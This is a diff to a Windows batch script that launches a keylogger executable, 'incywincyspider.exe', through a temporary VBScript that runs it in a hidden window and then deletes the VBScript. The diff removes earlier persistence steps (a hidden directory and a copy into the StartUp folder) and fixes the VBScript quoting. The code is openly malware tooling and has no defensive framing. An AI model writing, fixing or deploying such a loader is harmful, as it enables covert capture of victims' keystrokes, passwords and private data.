@@ -1,16 +1,11 @@
 @echo off
 echo Starting script... >> %TEMP%\debug.log
 set "KEYLOGGER_PATH=%ALLUSERSPROFILE%\AppDataLocal\HiddenDir\incywincyspider.exe"
-set "STARTUP_PATH=%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp\incywincyspider_starter.cmd"
 echo KEYLOGGER_PATH: %KEYLOGGER_PATH% >> %TEMP%\debug.log
-echo STARTUP_PATH: %STARTUP_PATH% >> %TEMP%\debug.log
-mkdir "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" 2>nul
-attrib +h "%ALLUSERSPROFILE%\AppDataLocal\HiddenDir" >nul
-copy "%~f0" "%STARTUP_PATH%" >nul
 if exist "%KEYLOGGER_PATH%" (
     echo Creating temporary VBScript to run EXE hidden... >> %TEMP%\debug.log
     echo Set WShell = CreateObject("WScript.Shell") > %TEMP%\run_hidden.vbs
-    echo WShell.Run """" & "%KEYLOGGER_PATH%" & """", 0, False >> %TEMP%\run_hidden.vbs
+    echo WShell.Run Chr(34) & "%KEYLOGGER_PATH%" & Chr(34), 0, False >> %TEMP%\run_hidden.vbs
     wscript %TEMP%\run_hidden.vbs
     echo Hidden run command executed. >> %TEMP%\debug.log
     del %TEMP%\run_hidden.vbs
